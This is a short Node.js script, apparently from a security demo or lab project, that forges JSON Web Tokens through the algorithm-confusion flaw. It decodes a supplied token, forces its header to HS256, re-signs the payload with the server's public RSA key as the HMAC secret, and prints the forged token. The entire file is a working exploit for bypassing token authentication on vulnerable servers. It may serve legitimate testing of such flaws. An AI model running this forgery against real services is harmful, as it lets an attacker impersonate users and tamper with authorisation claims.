#!/usr/bin/env node

/**
 * Sign an existing JWT header+payload using HS256 with the server's public key.
 * Usage: node scripts/signTokenHS256.js <jwt>
 *
 * This mimics the algorithm confusion vulnerability by re-signing a token
 * with HS256 and the public key as the secret.
 */

const fs = require('fs');
const path = require('path');
const jwt = require('jsonwebtoken');

const token = process.argv[2];
if (!token) {
  console.error('Usage: node scripts/signTokenHS256.js <jwt>');
  process.exit(1);
}

const segments = token.split('.');
if (segments.length !== 3) {
  console.error('Invalid token format. Expected header.payload.signature');
  process.exit(1);
}

const decodeBase64Url = (str) => Buffer.from(str, 'base64url').toString('utf8');

let header;
let payload;
try {
  header = JSON.parse(decodeBase64Url(segments[0]));
  payload = JSON.parse(decodeBase64Url(segments[1]));
} catch (err) {
  console.error('Failed to decode token:', err.message);
  process.exit(1);
}

const publicKeyPath = path.join(__dirname, '../keys/public.pem');
if (!fs.existsSync(publicKeyPath)) {
  console.error('Public key not found at', publicKeyPath);
  process.exit(1);
}
const publicKey = fs.readFileSync(publicKeyPath, 'utf8');

// Force HS256 header
const newHeader = {
  ...header,
  alg: 'HS256'
};

try {
  const forged = jwt.sign(payload, publicKey, {
    algorithm: 'HS256',
    header: newHeader
  });

  console.log('New HS256 token:');
  console.log(forged);
} catch (err) {
  console.error('Failed to sign token:', err.message);
  process.exit(1);
}


